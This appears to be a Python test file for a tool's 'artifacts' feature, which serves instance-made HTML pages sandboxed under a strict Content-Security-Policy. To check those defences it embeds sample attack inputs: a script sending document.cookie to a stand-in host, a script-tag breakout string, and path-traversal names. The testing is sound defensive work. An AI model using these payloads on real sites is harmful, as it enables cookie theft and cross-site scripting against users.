"""An instance's artifacts (supervisor/artifacts.py): one self-contained page that loads nothing and reaches nothing of
the operator's, told what it lacks; and the web UI and app routes that show it."""
from __future__ import annotations

import json
import os
import re
import shutil
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from supervisor import artifacts, web
from supervisor.web import Request


class ArtifactsTest(unittest.TestCase):
    def setUp(self):
        self.base = Path(tempfile.mkdtemp(prefix="shaft-art-")).resolve()
        self.addCleanup(shutil.rmtree, self.base, True)
        self.root = self.base / "wisp"
        (self.root / "notes").mkdir(parents=True)
        p = mock.patch.object(artifacts, "instance_root", lambda n: self.root)
        p.start()
        self.addCleanup(p.stop)
        self.addCleanup(artifacts._cache.clear)

    def put(self, slug: str, **files: str) -> Path:
        d = self.root / "notes" / "artifacts" / slug
        d.mkdir(parents=True, exist_ok=True)
        for name, text in files.items():
            (d / name.replace("_", ".", 1) if name in ("index_html", "data_json") else d / name).write_text(text)
        return d

    def test_the_policy_comes_before_anything_the_page_says_and_forbids_every_load(self):
        # A script placed before <head> must still be governed: the policy is the document's first element
        self.put("board", index_html="<!DOCTYPE html><script>fetch('https://x.example/'+document.cookie)</script>"
                                     "<html><head><title>B</title></head><body>hi</body></html>")
        doc = artifacts.page("wisp", "board")["html"]
        self.assertTrue(doc.startswith('<!DOCTYPE html><meta http-equiv="Content-Security-Policy"'), doc[:120])
        self.assertLess(doc.index("Content-Security-Policy"), doc.index("fetch("))
        for directive in ("default-src 'none'", "connect-src 'none'", "form-action 'none'", "frame-src 'none'",
                          "base-uri 'none'", "object-src 'none'"):
            self.assertIn(directive, artifacts.POLICY)
        self.assertNotIn("'self'", artifacts.POLICY)          # nothing of the origin that serves it
        self.assertNotRegex(artifacts.POLICY, r"https?:")
        self.assertTrue(artifacts.HEADER_POLICY.startswith("sandbox allow-scripts;"))
        self.assertNotIn("allow-same-origin", artifacts.HEADER_POLICY)

    def test_files_beside_it_are_inlined_and_data_json_becomes_window_shaft_data(self):
        self.put("board", index_html='<!doctype html><html><head><title>Sales &amp; costs</title>'
                                     '<link rel="stylesheet" href="look.css"><script defer src="lib.js"></script>'
                                     '</head><body></body></html>',
                 data_json='{"total": 3, "note": "</script><script>alert(1)</script>"}',
                 **{"lib.js": "var x = '</script>';", "look.css": "body{color:red}</style>"})
        page = artifacts.page("wisp", "board")
        doc = page["html"]
        self.assertEqual(page["title"], "Sales & costs")
        self.assertEqual(page["problems"], [])
        self.assertIn("<style>body{color:red}<\\/style></style>", doc)
        self.assertIn("<script>var x = '<\\/script>';</script>", doc)
        self.assertNotIn('src="lib.js"', doc)
        # The data cannot end its <script> early: no "<" survives in it
        data = re.search(r"window\.SHAFT_DATA=(.*?);window\.SHAFT_ARTIFACT=", doc)[1]
        self.assertNotIn("<", data)
        self.assertEqual(json.loads(data)["note"], "</script><script>alert(1)</script>")
        self.assertEqual(doc.count("</script>"), 2)        # the head's own and lib.js's: nothing the data opened

    def test_what_a_page_lacks_or_wants_from_the_network_is_said_never_dropped_silently(self):
        self.put("board", index_html='<html><head><script src="chart.js"></script>'
                                     '<script src="https://cdn.example/x.js"></script>'
                                     '<link rel="stylesheet" href="../other/a.css"></head>'
                                     '<body><img src="//img.example/p.png"></body></html>',
                 data_json="{nope")
        problems = artifacts.page("wisp", "board")["problems"]
        text = "\n".join(problems)
        self.assertIn("chart.js is named in index.html but is not in notes/artifacts/board/", text)
        self.assertIn("https://cdn.example/x.js: a page loads nothing from the network", text)
        self.assertIn("../other/a.css", text)
        self.assertIn("1 address(es) on the network", text)
        self.assertIn("data.json is not valid JSON", text)
        self.assertEqual(artifacts.listing("wisp")[0]["problems"], problems)

    def test_the_version_moves_when_data_or_a_file_changes_and_only_then(self):
        d = self.put("board", index_html='<script src="a.js"></script>', data_json='{"n": 1}', **{"a.js": "1"})
        v1 = artifacts.summary("wisp", "board")["version"]
        self.assertEqual(artifacts.summary("wisp", "board")["version"], v1)
        (d / "data.json").write_text('{"n": 2}')
        v2 = artifacts.summary("wisp", "board")["version"]
        self.assertNotEqual(v1, v2)
        (d / "a.js").write_text("2")
        self.assertNotEqual(artifacts.summary("wisp", "board")["version"], v2)
        self.assertEqual(artifacts.page("wisp", "board")["version"], artifacts.summary("wisp", "board")["version"])

    def test_links_and_bad_names_are_refused_and_nothing_outside_is_read(self):
        secret = self.base / "secret.js"
        secret.write_text("TOP SECRET")
        d = self.put("board", index_html='<script src="s.js"></script>')
        os.symlink(secret, d / "s.js")
        doc = artifacts.page("wisp", "board")
        self.assertNotIn("TOP SECRET", doc["html"])
        self.assertIn("s.js is named in index.html but is not in", "\n".join(doc["problems"]))
        os.symlink(self.base, self.root / "notes" / "artifacts" / "linked")
        self.assertEqual([a["slug"] for a in artifacts.listing("wisp")], ["board"])
        with self.assertRaises(artifacts.Refused):
            artifacts.page("wisp", "linked")
        for bad in ("../x", "Board", "a/b", "", ".hidden", "x" * 65):
            with self.assertRaises(artifacts.Refused, msg=bad):
                artifacts.page("wisp", bad)
        (d / "index.html").unlink()
        os.symlink(secret, d / "index.html")
        self.assertEqual(artifacts.listing("wisp"), [])

    def test_an_oversized_page_is_refused_in_words_and_listed_with_why(self):
        self.put("big", index_html="x" * (artifacts.MAX_PAGE + 1))
        with self.assertRaisesRegex(artifacts.Refused, "at most 1024 KB"):
            artifacts.page("wisp", "big")
        a = artifacts.listing("wisp")[0]
        self.assertEqual(a["slug"], "big")
        self.assertIn("at most 1024 KB", a["problems"][0])

    def test_a_folder_without_index_html_is_no_artifact(self):
        self.put("draft", data_json="{}")
        self.assertEqual(artifacts.listing("wisp"), [])
        self.assertIsNone(artifacts.summary("wisp", "draft"))


class SecuredTest(unittest.TestCase):
    """web._secured: only an artifact's page keeps its sandbox policy and may be framed (by this origin)."""

    def test_the_artifact_policy_is_kept_and_every_other_answer_stays_unframeable(self):
        art = web._secured(web.Response(200, b"x", {"Content-Type": "text/html; charset=utf-8",
                                                    "Content-Security-Policy": artifacts.HEADER_POLICY}))
        self.assertEqual(art.headers["Content-Security-Policy"], artifacts.HEADER_POLICY)
        self.assertEqual(art.headers["X-Frame-Options"], "SAMEORIGIN")
        page = web._secured(web.Response(200, b"x", {"Content-Type": "text/html; charset=utf-8"}))
        self.assertEqual(page.headers["Content-Security-Policy"], web.CSP)
        self.assertEqual(page.headers["X-Frame-Options"], "DENY")
        # any other policy a route might set is replaced by the site's own, never kept
        other = web._secured(web.Response(200, b"x", {"Content-Security-Policy": "default-src *"}))
        self.assertEqual(other.headers["Content-Security-Policy"], web.CSP)
        self.assertEqual(other.headers["X-Frame-Options"], "DENY")


if __name__ == "__main__":
    unittest.main()


from supervisor.tests import test_app_api      # noqa: E402 — its AppTest: a paired app and browser, temp folders


class RoutesTest(test_app_api.AppTest):
    """Through web.respond, as a browser and the apps reach them."""

    def setUp(self):
        super().setUp()
        self.addCleanup(artifacts._cache.clear)
        d = self.inst / "wisp" / "notes" / "artifacts" / "board"
        d.mkdir(parents=True)
        (d / "index.html").write_text("<!doctype html><title>Board</title><p id=v></p>"
                                      "<script>v.textContent = SHAFT_DATA.n</script>")
        (d / "data.json").write_text('{"n": 7}')
        self.cookie = self.paired()

    def test_the_tab_frames_the_page_by_its_version_and_the_page_is_sandboxed(self):
        r = self.req("/i/wisp/artifacts", cookie=self.cookie)
        self.assertEqual(r.status, 200, r.body)
        body = r.body.decode()
        version = artifacts.summary("wisp", "board")["version"]
        self.assertIn(f'sandbox="allow-scripts" referrerpolicy="no-referrer" src="/i/wisp/artifact?a=board&amp;v={version}"',
                      body)
        self.assertEqual(r.headers["X-Frame-Options"], "DENY")       # the tab itself is the site's own page
        page = self.req(f"/i/wisp/artifact?a=board&v={version}", cookie=self.cookie)
        self.assertEqual(page.status, 200, page.body)
        self.assertEqual(page.headers["Content-Type"], "text/html; charset=utf-8")
        self.assertEqual(page.headers["Content-Security-Policy"], artifacts.HEADER_POLICY)
        self.assertEqual(page.headers["X-Frame-Options"], "SAMEORIGIN")
        self.assertIn(b"window.SHAFT_DATA={\"n\":7}", page.body)
        # without the paired cookie, nothing: the page is the operator's like any other
        self.assertEqual(self.req("/i/wisp/artifact?a=board").status, 403)
        self.assertEqual(self.req("/i/wisp/artifact?a=nope", cookie=self.cookie).status, 404)

    def test_the_tabs_first_refresh_is_a_304_so_the_frame_loads_once(self):
        page = self.req("/i/wisp/artifacts", cookie=self.cookie).body.decode()
        m = re.search(r'data-poll="([^"]+)" data-every="2000" data-etag="([^"]+)" data-etag-url="\1"', page)
        self.assertTrue(m, page)
        url = m[1].replace("&amp;", "&")
        first = self.req(url, cookie=self.cookie, headers={"if-none-match": m[2].replace("&quot;", '"')})
        self.assertEqual(first.status, 304, "the polled part as the page drew it is not what the fragment answers")

    def test_the_polled_part_changes_only_when_the_artifact_does(self):
        first = self.req("/fragment/artifacts/wisp?a=board", cookie=self.cookie)
        again = self.req("/fragment/artifacts/wisp?a=board", cookie=self.cookie,
                         headers={"if-none-match": first.headers["ETag"]})
        self.assertEqual(again.status, 304)
        (self.inst / "wisp" / "notes" / "artifacts" / "board" / "data.json").write_text('{"n": 8}')
        moved = self.req("/fragment/artifacts/wisp?a=board", cookie=self.cookie,
                         headers={"if-none-match": first.headers["ETag"]})
        self.assertEqual(moved.status, 200)
        self.assertIn(artifacts.summary("wisp", "board")["version"], moved.body.decode())

    def test_the_app_lists_and_fetches_it_as_json_never_as_a_page(self):
        listing = self.get("/app/v1/artifacts/wisp")
        self.assertEqual([a["slug"] for a in listing["artifacts"]], ["board"])
        page = self.get("/app/v1/artifacts/wisp/page?slug=board")
        self.assertIn('<meta http-equiv="Content-Security-Policy"', page["html"])
        self.assertEqual(page["version"], listing["artifacts"][0]["version"])
        self.assertEqual(self.api("/app/v1/artifacts/wisp/page?slug=nope").status, 404)
        self.assertEqual(self.api("/app/v1/artifacts/wisp/page?slug=../x").status, 409)
        self.assertEqual(self.api("/app/v1/artifacts/wisp/page").status, 400)
        self.assertEqual(self.api("/app/v1/artifacts/wisp", bearer=False).status, 401)
